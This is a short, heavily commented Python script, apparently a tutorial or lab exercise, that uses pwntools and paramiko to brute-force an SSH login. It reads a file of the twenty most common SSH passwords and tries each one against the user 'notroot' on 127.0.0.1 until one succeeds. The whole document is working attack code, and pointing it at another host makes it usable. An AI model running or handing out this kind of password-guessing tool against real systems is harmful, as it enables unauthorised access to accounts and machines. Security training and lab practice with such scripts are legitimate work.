from pwn import *
import paramiko

host = "127.0.0.1" # Host the attack will be performed against.
username = "notroot" # The username of the target we're attacking
attempts = 0 # A log of number of login attempts made; useful for noting how many attempts it took to authenticate

with open("top-20-common-SSH-passwords.txt", "r") as password_list: # Open the passwords.txt file and use "r" to use read-mode; call it password_list
  for password in password_list: # Iterate over each password in the list
  	password = password.strip("\n") # Clean it up and remove the new line
  	try: # Try/Catch statement for handling authentication errors
  	  print("[{}] Attempting password: '{}'!".format(attempts, password)) # Prints out the password attempt number and the attempted password
  	  response = ssh(host=host, user=username, password=password, timeout=1) # Sets the parameters for the brute force attack. These are required by pwn.
  	  if response.connected(): # If a successful authentication is in the Response
  	  	print("[>] Valid password found: '{}'!".format(password)) # Return the message stating the successful password
  	  	response.close() # Close the successful connection 
  	  	break # Break the loop
  	  response.close() # Close connection even if invalid attempt is found
  	except paramiko.ssh_exception.AuthenticationException: # Exception for handling invalid authentication attempts
  	  print("[X] Invalid password!") # Message returned for invalid attempts
  	attempts += 1 # Increase the number of attempts per loop cycle